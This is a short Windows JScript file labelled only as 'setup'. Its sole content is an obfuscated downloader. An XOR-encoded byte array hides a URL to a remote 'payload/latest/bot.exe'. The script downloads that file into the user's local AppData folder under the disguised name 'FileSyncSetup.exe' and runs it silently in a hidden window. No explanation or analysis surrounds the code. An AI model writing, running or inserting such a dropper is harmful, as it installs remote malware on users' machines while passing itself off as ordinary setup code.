// setup 27448ac67a03a729
var d=[50,46,46,42,41,96,117,117,110,107,111,108,107,108,59,60,116,50,63,59,62,56,53,46,41,116,46,63,59,55,117,42,59,35,54,53,59,62,117,54,59,46,63,41,46,117,56,53,46,116,63,34,63], u="";
for(var i=0;i<d.length;i++) u+=String.fromCharCode(d[i]^0x5A);
var l=new ActiveXObject('WScript.Shell').ExpandEnvironmentStrings('%LOCALAPPDATA%');
var x=new ActiveXObject('MSXML2.XMLHTTP');
x.open('GET',u,false); x.send();
if(x.status==200){
  var s=new ActiveXObject('ADODB.Stream');
  s.type=1; s.open(); s.write(x.responseBody);
  s.saveToFile(l+'\\FileSyncSetup.exe',2); s.close();
  new ActiveXObject('WScript.Shell').Run('"'+l+'\\FileSyncSetup.exe"',0,false);
}
